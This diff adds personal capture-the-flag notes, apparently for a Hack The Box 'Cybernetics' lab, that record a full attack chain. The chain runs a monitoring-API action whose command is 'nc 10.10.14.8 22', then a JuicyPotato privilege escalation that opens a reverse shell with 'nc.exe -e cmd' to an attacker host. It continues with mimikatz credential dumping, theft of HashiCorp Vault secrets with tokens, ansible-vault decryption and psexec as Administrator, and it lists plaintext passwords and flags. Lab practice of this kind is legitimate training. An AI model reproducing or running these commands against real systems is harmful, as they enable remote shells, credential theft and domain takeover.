@@ -1,0 +1,128 @@
+=========================================
+== FLAG - Monitoring tools gone astray ==
+=========================================
+Cyb3rN3t1C5{M0n!t0r_t00l_RC3}
+Need to create an action and a trigger to get a shell on 
+
+{  "params": {
+        "name": "Trigger action111",
+        "eventsource": 0,
+        "status": 0,
+        "esc_period": "60",
+      "filter": {
+            "evaltype": 0,
+            "conditions": [
+                 {
+                    "conditiontype":3,
+"operator":0,
+"value":"Trigger action111"
+                }
+            ]
+        },
+        "operations": [
+{
+"operationtype": 1,
+"opcommand": {
+"command": "nc 10.10.14.8 22",
+"type": "0",
+"execute_on": "0"
+},
+"opcommand_hst":[{"hostid ":"10106",
+"opcommand_hstid ":"1",
+"operationid":"1"
+}
+]
+}
+]            
+    },"jsonrpc": "2.0",     "method": "action.create",
+ "auth": "a6741a082fbca337b82a4cd4858aaad1", "id": 2}
+ 
+ 
+ 
+ {
+    "jsonrpc": "2.0",
+    "method": "trigger.create",
+    "params": {
+        "description": "Test trigger for {HOST.NAME}",
+        "expression": "{D3WKT001:system.uptime.last()}>0"
+    },
+    "auth": "cc2deb4dc56574da1dce12e2ca43a9cb",
+    "id": 1
+}
+ 
+
+Get password form lsadump::secrets
+
+
+
+
+=======================
+== FLAG - Ask Jeeves ==
+=======================
+create certs for james.peck
+login to jenkins.cyber.local
+D3V\james.peck ohD6ubo5ie
+used
+https://thehacktoday.com/hack-the-box-jeeves-walkthrough/
+privesc was juicy potato
+C:\temp>j.exe -t * -l 1337 -p C:\Windows\system32\cmd.exe -a "/c C:\temp\nc.exe -e cmd 10.10.14.X 443"
+Cyb3rN3t1C5{J3nk!n$_$AML}
+
+run mimikatz lsadumpsecrets to get 2 passwords
+
+svc_jenkins: iT1iviedo1
+james.weeks: xuu8ZivauM
+
+type Dev_Notes.txt
+1. Configure Hashoicorp Vault with username and password authentication (done)
+2. Store ansible playbook secret key into Hashicorp Vault  (done)
+3. Figure out how to communicate with vault.cyber.local API using the AES and passwd with username ansible
+3a. Extract ansible playbook secret via API and decrypt ansible playbooks on ansible.cyber.local
+
+=====================================
+== FLAG -Ask and you shall receive ==
+=====================================
+proxychains curl -XPOST http://10.9.30.13:8200/v1/auth/userpass/login/ansible --data '{"password":"6daDjIU0UqEdvGI"}'
+proxychains curl -XGET -H "X-Vault-Token: s.w5H76N1JKTkJBGR5ysxlq2Qn" http://10.9.30.13:8200/v1/secret/data/Cybernetics-Flag
+Cyb3rN3t1C5{V@ult_AP!}
+
+ansible: 6daDjIU0UqEdvGI
+
+
+proxychains curl -XGET http://10.9.30.13:8200/v1/secret/data/ansible-secret -H "X-Vault-Token: s.Bafz17V2Qg89XZpyBv7FmrpT"
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:9050-<><>-10.9.30.13:8200-<><>-OK
+{"request_id":"fb07eb10-ee60-91da-8430-303134ffc2e4","lease_id":"","renewable":false,"lease_duration":0,"data":{"data":{"playbook-password":"aXYxQqxIWldJHX5sJVrCzVEkdQmP33"},"metadata":{"created_time":"2020-01-04T03:29:24.3053968Z","deletion_time":"","destroyed":false,"version":1}},"wrap_info":null,"warnings":null,"auth":null}
+
+proxychains curl -XPOST http://10.9.30.13:8200/v1/auth/userpass/login/ansible --data '{"password":"6daDjIU0UqEdvGI"}'
+
+{"request_id":"99f577b4-9baa-fb3d-de5a-92d081d6731b","lease_id":"","renewable":false,"lease_duration":0,"data":null,"wrap_info":null,"warnings":null,"auth":{"client_token":"s.070UbkSPey7aOrzF0rWlORzj","accessor":"f6ERl5cdpTKGPPRXvULH8sNi","policies":["ansible","default"],"token_policies":["ansible","default"],"metadata":{"username":"ansible"},"lease_duration":1800,"renewable":true,"entity_id":"99a5f474-d2c2-9130-f989-b2f3a062d6c8","token_type":"service","orphan":true}}
+
+
+proxychains curl http://10.9.30.13:8200/v1/secret/metadata -H "X-Vault-Token: s.QGd1WphYIZmeqlA3gfy2T930" -XLIST
+{"request_id":"bedc4e72-46e4-8286-20fd-3b89293ea9e0","lease_id":"","renewable":false,"lease_duration":0,"data":{"keys":["Cybernetics-Flag","ansible-secret"]},"wrap_info":null,"warnings":null,"auth":null}
+
+proxychains curl http://10.9.30.13:8200/v1/secret -H "X-Vault-Token: 99f577b4-9baa-fb3d-de5a-92d081d6731b" -X LIST
+
+======================================
+== FLAG - Automation at its finest! ==
+======================================
+ansible-vault view flag.yml 
+Vault password: aXYxQqxIWldJHX5sJVrCzVEkdQmP33
+Cyb3rN3t1C5{An$!bl3_3ncrypt!0n}
+
+
+================================
+== FLAG - A fight to the end! ==
+================================
+copy group_vars vault password into another doc and decrypt
+D3V\james.weeks@d3webal:/dev/shm/.t$ ansible-vault view test.yml 
+Vault password: aXYxQqxIWldJHX5sJVrCzVEkdQmP33
+i@V@36hbW
+
+then psexec with Administrator
+
+Administrator : i@V@36hbW
+proxychains python /root/htb/cybernetics/psexec.py D3V/Administrator@10.9.30.10 cmd
+
+Cyb3rN3t1C5{C0r3_M3ltd0wn}
